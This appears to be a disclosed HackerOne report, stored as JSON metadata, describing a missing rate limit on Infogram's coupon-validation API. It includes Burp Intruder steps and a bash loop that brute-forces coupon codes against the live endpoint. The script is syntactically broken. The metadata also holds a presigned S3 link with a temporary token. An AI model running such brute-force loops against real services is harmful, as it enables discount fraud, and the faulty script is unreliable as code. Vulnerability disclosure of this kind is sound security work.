@@ -1,0 +1,116 @@
+{
+  "id": 288846,
+  "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8yODg4NDY=",
+  "url": "https://hackerone.com/reports/288846",
+  "title": "Bruteforcing Coupons",
+  "state": "Closed",
+  "substate": "resolved",
+  "readable_substate": "Resolved",
+  "created_at": "2017-11-09T15:57:10.803Z",
+  "submitted_at": "2017-11-09T15:57:10.803Z",
+  "is_member_of_team?": false,
+  "is_organization_group_member?": false,
+  "is_triager?": false,
+  "reporter": {
+    "disabled": false,
+    "username": "t-pwn",
+    "url": "/t-pwn",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/beSrUdM5a9NfVE85FkwjQEPD/3cb67cc78dc0cba55b102dd9eca2ee89b206d3e960be830f070583d9070b69ef"
+    },
+    "is_me?": false,
+    "cleared": false,
+    "verified": false,
+    "hackerone_triager": false,
+    "hacker_mediation": false
+  },
+  "team": {
+    "id": 21745,
+    "url": "https://hackerone.com/infogram",
+    "handle": "infogram",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/000/021/745/553edf21f45ba8f73faba5d308e0d91fc026fef0_original.png/235acf2ba808c3a51a94888fb977392c26f8fb0ccf77a81a4546c5e4065c06f1",
+      "medium": "https://profile-photos.hackerone-user-content.com/variants/000/021/745/553edf21f45ba8f73faba5d308e0d91fc026fef0_original.png/3f1ab5c6a9b6dadada1e6c8121700b884388bd0a43471fee1897a38ce57d0b2c"
+    },
+    "permissions": [],
+    "submission_state": "paused",
+    "default_currency": "usd",
+    "awards_miles": false,
+    "offers_bounties": false,
+    "state": "public_mode",
+    "only_cleared_hackers": false,
+    "pentest_feature_enabled?": false,
+    "pentest_retesting_ends_at": null,
+    "profile": {
+      "name": "Infogram",
+      "twitter_handle": "infogram",
+      "website": "http://infogram.com",
+      "about": "Make Infographics and Charts that People Love"
+    }
+  },
+  "has_bounty?": false,
+  "can_view_team": true,
+  "can_view_report": true,
+  "is_external_bug": false,
+  "is_published": false,
+  "is_participant": false,
+  "has_collaborators": false,
+  "submitted_by_team_member": false,
+  "submitted_with_assistant": false,
+  "stage": 4,
+  "public": true,
+  "visibility": "full",
+  "cve_ids": [],
+  "singular_disclosure_disabled": false,
+  "disclosed_at": "2017-12-12T19:48:01.100Z",
+  "bug_reporter_agreed_on_going_public_at": "2017-12-12T17:23:37.471Z",
+  "team_member_agreed_on_going_public_at": "2017-12-12T19:48:01.031Z",
+  "comments_closed?": false,
+  "facebook_team?": false,
+  "team_private?": false,
+  "vulnerability_information": "Hi,\n\nwhile i was fuzzing for an API endpoints i found this endpoint: https://infogram.com/api/discounts\nthe first thing came on my mind is bruteforcing the coupon codes so i gave it a try and it worked!\nthere's no rate limit on that endpoint so an attacker could use it to bruteforce the coupon codes and filter the results to snipe the \"valid\":true response\n\n##Steps to reproduce:\n\n+ intercept the request using burpsuite or any proxy tool you would like to use\n\n+ send the request to the intruder\n\n+ configure the payload position\n\n     {F238091}\n\n+ start the attack\n\ni wrote a simple script in bash to do the operation\n\n```\n\n#!/bin/bash\n\nwhile [ 1 ]\ndo\n\n  coupon=$(cat /dev/urandom | tr -dc 'a-z0-9' | fold -w 6 | head -n 1)\n  curl=$(curl -i -s -k  -X $'GET' \\\n    -H $'X-Requested-With: XMLHttpRequest' \\\n    -b $'Cookies:XXXXXXX' \\\n    $'https://infogram.com/api/discounts/$coupon')\n\n  if [[ $curl == *\"valid\":true* ]]\n    echo \"$coupon is valid\";\n  else\n    echo \"$coupon is invalid\";\n  \nbreak;\n\n```\n\nThanks.",
+  "original_report_id": null,
+  "original_report_url": null,
+  "attachments": [
+    {
+      "id": 238091,
+      "file_name": "Screenshot_from_2017-11-09_10-28-27.png",
+      "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/238/091/0648845be6ef99c4f4ade7764047c4f75353ee56/Screenshot_from_2017-11-09_10-28-27.png?response-content-disposition=attachment%3B%20filename%3D%22Screenshot_from_2017-11-09_10-28-27.png%22%3B%20filename%2A%3DUTF-8%27%27Screenshot_from_2017-11-09_10-28-27.png&response-content-type=image%2Fpng&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQTUP4YAQL%2F20260221%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20260221T030017Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjENn%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCIQCoNd%2BEKEO57Bc1zAzd7ptk1U2zyMcdAtMybHVAMBLgeAIgSK4GDS7Q7e%2F7JDdE4MND15qsBUGmGaJSlHMXssw6UGgquwUIov%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FARADGgwwMTM2MTkyNzQ4NDkiDId2PiDogBpC02xGnyqPBd4NOifRDce1DmqNAmDEkHC%2FHfyzN3kIrXhpfhTjujX9Xgl5Xq5P%2B7oUOmivAg0a0%2F9GOMPjPwciI8NSMoZIkOCrWnHVSkDWgODA4gjsjOvzF5yKtRLqBFwU9oLqfh0mlIocVDSmCfZNMPQwwWQjuJydlkNCjcU9D6pZJ4%2F5yFi7YsPw85tKVW96tf9K4p9d7Bln2LQZVQVJtc%2F67CdCpyCkJg%2BsZy9SAJMFN703kNhxsGx6FaTBZPopkG1X5%2Fs0DowLFvjX0IQs8mJH%2F7%2BDOGxOADAY%2BxlXC6ZkNONWsxtfN9TvExJPtCRL6HS6DdGtDWDrQZA9Kf9IC4TnBxvLU79cjVZF1UfpGmp4Inga6lIurvGxeXBiBo7NXfgUq6zZ2btO4fiojaJDCRP5Wx5cfqhHv9jLKWnMchTT%2Ff6LwuabdJaoNTIujqsQsI4%2BD90z6qss82kpQKd1vgpecdFT9FhIEfY2Fm5rjssBqkV%2BfJw5FZimgDcnMvOTXpwABDohERzFvw08f%2BEI%2Fvi9o5yC7OV%2FaUrn1BLXrVfLm4CU4KgQfdnWayDOenj1Dv%2BlzZydBSPaDSxmamrsDjVjG22%2F9qJe1wWUpNqIuvRUSK%2FOk2FczqexcHZQV5Ln8CtpHezYvoWEFlO2RT8QBBHg%2FU7bq7jMKUNtQYpnZ7gvAzPmY42lwymFHpSEaIlL3%2FtZNEreSaahnNz7yvwkhIWUgEMILkTewBwoWgI%2FrdpPRlFdx921iWCf0egkHYWz3nk4%2ByLid55MuO7dv9VOqlwO080zTEnU%2BNDZRrYUWD2%2BGi4KTNaGI0cywWbXEs1vAq0hWciyHxQvkaPp3rLAocr%2FY7tkDHC3HARTdqKWKseIWDyr6oIwu4TkzAY6sQG%2FAi0gnR1%2FRtXHzQfZNPESuk48qNAB48Ynu8Lsc%2FcW%2FwiyyAFK1U%2Ft2WV3yBJ7xKP3hXHMBZ9n5GfT2TtW9hsYM1DdhCunN1NBa7EHRhRc%2FgflzHaQCWcvOrWTeqc9Nuls98npRLoTldVsjn51Z1DE8sTDy3S84tlknlUSb0FemkgDs30VzbhFJnAKWjFLgkxNromstetmWhdgVZoOdl6qfxiXfe8BEe%2BjkGf0%2Bzs0lOI%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=eb63c8e4efbcbaf939b835bfd52f20c547ecdbcf0d4f1a86fabb70355337dc19",
+      "file_size": 70728,
+      "type": "image/png",
+      "moderated": null
+    }
+  ],
+  "allow_singular_disclosure_at": "2018-01-11T17:23:37.546Z",
+  "allow_singular_disclosure_after": -255951399.97983596,
+  "singular_disclosure_allowed": true,
+  "vote_count": 3,
+  "voters": [
+    "r3y",
+    "eveeez",
+    "japz"
+  ],
+  "structured_scope": {
+    "databaseId": 870,
+    "asset_type": "URL",
+    "asset_identifier": "infogram.com",
+    "max_severity": "critical"
+  },
+  "abilities": {
+    "assignable_team_members": [],
+    "assignable_team_member_groups": []
+  },
+  "is_exploit_agent_supported?": false,
+  "summaries": [
+    {
+      "category": "team",
+      "can_view?": true,
+      "can_create?": false
+    },
+    {
+      "category": "researcher",
+      "can_view?": true,
+      "can_create?": false
+    }
+  ]
+}
